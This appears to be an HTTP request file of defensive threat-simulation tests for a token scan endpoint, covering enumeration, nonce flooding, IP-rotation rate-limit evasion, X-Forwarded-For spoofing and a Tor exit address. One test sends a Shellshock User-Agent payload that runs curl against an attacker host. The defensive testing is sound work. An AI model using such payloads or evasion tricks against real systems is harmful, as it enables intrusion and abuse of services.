### ═══════════════════════════════════════════════════════════════════════════
### [H] THREAT SIMULATION — real attack patterns
### ═══════════════════════════════════════════════════════════════════════════

# [H-1] Token enumeration — sequential guesses
# EXPECTED: all HTTP 200, state="INVALID"
# KEY CHECK: Watch your PostgreSQL query log (log_min_duration_statement=0)
#            Zero Token table queries should fire for these
#            Confirms: AES-SIV rejects in pure crypto before DB
GET {{BASE_URL}}{{SCAN_PATH}}/1111111111111111111111111111111111111111111
User-Agent: python-requests/2.31.0
X-Forwarded-For: 185.220.101.1
Accept: application/json

###

GET {{BASE_URL}}{{SCAN_PATH}}/2222222222222222222222222222222222222222222
User-Agent: python-requests/2.31.0
X-Forwarded-For: 185.220.101.1
Accept: application/json

###

GET {{BASE_URL}}{{SCAN_PATH}}/ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefg
User-Agent: python-requests/2.31.0
X-Forwarded-For: 185.220.101.1
Accept: application/json

###

# [H-2] Nonce flood — scan UNASSIGNED card 5 times
# EXPECTED: identical nonce in all 5 responses
# VERIFY:   SELECT COUNT(*) FROM "RegistrationNonce"
#             WHERE token_id = (SELECT id FROM "Token"
#               WHERE school_id = (SELECT id FROM "School" WHERE code='RQ-TEST-SCAN')
#               AND status = 'UNASSIGNED');
#           Count must be 1 regardless of how many times you run this
GET {{BASE_URL}}{{SCAN_PATH}}/{{UNASSIGNED_CODE}}
User-Agent: FloodTest/1.0
X-Forwarded-For: 185.220.101.2
Accept: application/json

###

GET {{BASE_URL}}{{SCAN_PATH}}/{{UNASSIGNED_CODE}}
User-Agent: FloodTest/1.0
X-Forwarded-For: 185.220.101.2
Accept: application/json

###

GET {{BASE_URL}}{{SCAN_PATH}}/{{UNASSIGNED_CODE}}
User-Agent: FloodTest/1.0
X-Forwarded-For: 185.220.101.2
Accept: application/json

###

# [H-3] Distributed botnet — same code, rotating IPs (bypasses IP limit)
# EXPECTED: requests 1-20 succeed; request 21+ → HTTP 429 (per-token limit)
# Each IP is under 10/min, but the token counter is shared across all IPs
# CONFIRMS: perTokenScanLimit keys on scan CODE, not IP
GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
User-Agent: Botnet/1.0
X-Forwarded-For: 10.10.10.1
Accept: application/json

###

GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
User-Agent: Botnet/1.0
X-Forwarded-For: 10.10.10.2
Accept: application/json

###

GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
User-Agent: Botnet/1.0
X-Forwarded-For: 10.10.10.3
Accept: application/json

###

# [H-4] XFF spoofing — attacker claims localhost
# EXPECTED: ScanLog.ip_address must NOT be 127.0.0.1
#           extractIp() should read the rightmost trusted proxy, not leftmost
# VERIFY:   SELECT ip_address FROM "ScanLog" ORDER BY created_at DESC LIMIT 1;
GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
User-Agent: ResQidScanner/1.0
X-Forwarded-For: 127.0.0.1, 10.0.0.1, 203.0.113.200
Accept: application/json

###

# [H-5] Shellshock / command injection in User-Agent
# EXPECTED: HTTP 200, UA saved as plain string in ScanLog
#           Server must NOT make any outbound HTTP request
GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
User-Agent: () { :;}; curl http://attacker.example.com/pwned
X-Forwarded-For: 192.0.2.90
Accept: application/json

###

# [H-6] Oversized User-Agent (log injection / buffer probe)
# EXPECTED: HTTP 200 or HTTP 413 depending on header size limit config
#           Must NOT crash the server
GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
User-Agent: 
X-Forwarded-For: 192.0.2.91
Accept: application/json

###

# [H-7] Tor exit node simulation
# EXPECTED: HTTP 403 if ipReputation blocklist includes this range
#           HTTP 200 if not yet in blocklist
# NOTE: 185.220.100.x is a real Tor exit range — add to ipReputation
GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
User-Agent: Mozilla/5.0
X-Forwarded-For: 185.220.100.252
Accept: application/json


